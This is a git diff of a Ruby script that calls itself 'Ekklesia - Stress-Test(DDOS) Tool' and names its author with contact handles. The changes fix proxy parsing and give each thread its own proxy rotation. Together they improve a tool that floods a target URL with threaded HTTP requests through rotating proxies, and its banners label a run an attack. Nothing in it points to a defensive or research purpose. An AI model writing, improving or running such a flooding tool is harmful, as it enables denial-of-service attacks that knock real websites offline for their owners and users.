@@ -6,10 +6,10 @@ require 'thread'
 # Display the initial banner
 def banner
   puts "==========================================="
-  puts "          Ekklesia - Stress-Test(DDOS) Tool "
-  puts "      Created by TheCybercoach              "
-  puts "      Email: thecybercoach971@gmail.com     "
-  puts "      Telegram:@france205                   "
+  puts "          Ekklesia - Stress-Test(DDOS) Tool"
+  puts "      Created by TheCybercoach"
+  puts "      Email: thecybercoach971@gmail.com"
+  puts "      Telegram:@france205"
   puts "==========================================="
 end
 
@@ -73,7 +73,7 @@ end
 # Display attack details banner
 def attack_details_banner(url, threads, requests_per_thread, proxy_enabled, method, layer)
   puts "==========================================="
-  puts "           Ekklesia - Attack Details        "
+  puts "           Ekklesia - Attack Details"
   puts "==========================================="
   puts "Tool:       Ekklesia"
   puts "Author:     TheCybercoach"
@@ -94,7 +94,8 @@ def send_request(url, method, proxy = nil)
   http.use_ssl = (uri.scheme == "https")
 
   if proxy
-    proxy_uri = URI.parse("http://#{proxy}") unless proxy.start_with?("http://", "https://")
+    proxy = "http://#{proxy}" unless proxy.start_with?("http://", "https://")
+    proxy_uri = URI.parse(proxy)
     http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
   end
 
@@ -139,13 +140,14 @@ def check_server_status(url)
   end
 end
 
-# Main stress test logic
+# Updated stress test logic with Fix 1
 def stress_test(url, threads, requests_per_thread, proxies, method)
   thread_pool = []
-  proxies_cycle = proxies.cycle
 
   threads.times do
     thread_pool << Thread.new do
+      proxies_cycle = proxies.cycle # Each thread gets its own cycle
+
       requests_per_thread.times do
         proxy = proxies.any? ? proxies_cycle.next : nil
         send_request(url, method, proxy)
